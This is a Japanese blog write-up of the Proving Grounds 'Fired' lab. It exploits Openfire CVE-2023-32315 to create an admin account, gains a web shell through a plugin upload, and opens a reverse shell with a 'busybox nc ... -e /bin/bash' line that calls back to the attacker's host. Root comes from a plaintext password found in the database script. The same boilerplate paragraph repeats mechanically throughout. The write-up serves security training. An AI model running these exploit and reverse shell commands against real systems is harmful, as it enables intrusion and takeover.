---
title: "Proving Grounds - Fired (Linux)"
date: 2026-02-25
description: "Proving Grounds Fired Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-fired/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Web application and exposed network services |
| 主な侵入経路 | Web RCE (CVE-2023-32315) |
| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## 初期足がかり

---
![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127000402.png)
*キャプション：このフェーズで取得したスクリーンショット*

https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 CVE-2023-32315.py -u http://192.168.200.96:9090
```

```bash
✅[0:02][CPU:32][MEM:64][TUN0:192.168.45.178][...ed/CVE-2023-32315-EXPLOIT]
🐉 > python3 CVE-2023-32315.py -u http://192.168.200.96:9090

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██████  ██████  ██████   ██ ███████
██      ██    ██ ██                 ██ ██  ████      ██      ██            ██      ██      ██ ███ ██
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████  █████   █████   █████   ██ ███████
██       ██  ██  ██            ██      ████  ██ ██           ██            ██ ██           ██  ██      ██
 ██████   ████   ███████       ███████  ██████  ███████ ██████        ██████  ███████ ██████   ██ ███████

Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ

[*] Launching exploit against: http://192.168.200.96:9090
[*] Checking if the target is vulnerable
[+] Target is vulnerable
[*] Adding credentials
[+] Successfully added, here are the credentials
[+] Username: hugme
[+] Password: HugmeNOW

```

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127000514.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127000634.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127000643.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127000945.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127021548.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127021605.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127021719.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fired engagement](/assets/img/pg/fired/Pasted%20image%2020260127021757.png)
*キャプション：このフェーズで取得したスクリーンショット*

Retrieved local.txt:
`2590f1225d2dd2a4d0961714b11afd29`
💡 なぜ有効か  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---
`/bin/busybox nc 192.168.45.178 80 -e /bin/bash`
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
rlwrap -cAri nc -lvnp 80
```

```bash
❌[2:35][CPU:23][MEM:63][TUN0:192.168.45.178][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 80
listening on [any] 80 ...
openfire@openfire:/$

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat openfire.script
```

```bash
openfire@openfire:/var/lib/openfire/embedded-db$ cat openfire.script
INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
su - root
```

```bash
openfire@openfire:/var/lib/openfire/embedded-db$ su - root
Password: OpenFireAtEveryone
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat proof.txt
```

```bash
root@openfire:~# cat proof.txt
2b261aa40f8020a44ad5a6d2fda10327
```

💡 なぜ有効か  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[サービス列挙<br/>22/9090/9091]
        K1C[Openfire発見<br/>Port 9090/9091]
        K1D[バージョン特定<br/>Openfire 4.7.3]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>脆弱性特定"]
        direction TB
        K2A[CVE検索<br/>CVE-2023-32315]
        K2B[脆弱性確認<br/>Auth Bypass]
        K2C[エクスプロイト選定<br/>K3ysTr0K3R版]
        K2D[攻撃可能判定<br/>3.10.0-4.7.4]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>初期侵入"]
        direction TB
        K3A[Path Traversal<br/>setup-s/%u002e%u002e]
        K3B[認証バイパス<br/>user-create.jsp]
        K3C[管理者作成<br/>hugme:HugmeNOW]
        K3D[Admin Console<br/>ログイン成功]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>RCE取得"]
        direction TB
        K4A[プラグイン準備<br/>management-tool]
        K4B[プラグインアップロード<br/>Admin Console]
        K4C[Webシェルアクセス<br/>management-tool.jsp]
        K4D[OSコマンド実行<br/>Command Injection]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>シェル確立"]
        direction TB
        K5A[リバースシェル<br/>busybox nc]
        K5B[openfireユーザー<br/>uid=114]
        K5C[環境確認<br/>id/groups]
        K5D[local.txt取得<br/>2590f122...]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>権限昇格準備"]
        direction TB
        K6A[ファイル列挙<br/>/var/lib/openfire]
        K6B[データベース発見<br/>embedded-db/]
        K6C[スクリプト確認<br/>openfire.script]
        K6D[内容精査<br/>cat openfire.script]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>認証情報発見"]
        direction TB
        K7A[SMTP設定発見<br/>mail.smtp.*]
        K7B[パスワード抽出<br/>OpenFireAtEveryone]
        K7C[ユーザー確認<br/>username=root]
        K7D[認証情報確定<br/>root:OpenFireAtEveryone]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8<br/>権限昇格"]
        direction TB
        K8A[su実行<br/>su - root]
        K8B[パスワード入力<br/>OpenFireAtEveryone]
        K8C[rootシェル確立<br/>uid=0 gid=0]
        K8D[proof.txt取得<br/>2b261aa4...]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9<br/>目標達成"]
        direction TB
        K9A[完全制御<br/>root access]
        K9B[フラグ回収<br/>local + proof]
        K9C[永続化可能<br/>SSH Key等]
        K9D[完了<br/>Mission Success]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#81d4fa
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K8C fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```

## 参考文献

- CVE-2023-32315: https://nvd.nist.gov/vuln/detail/CVE-2023-32315
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
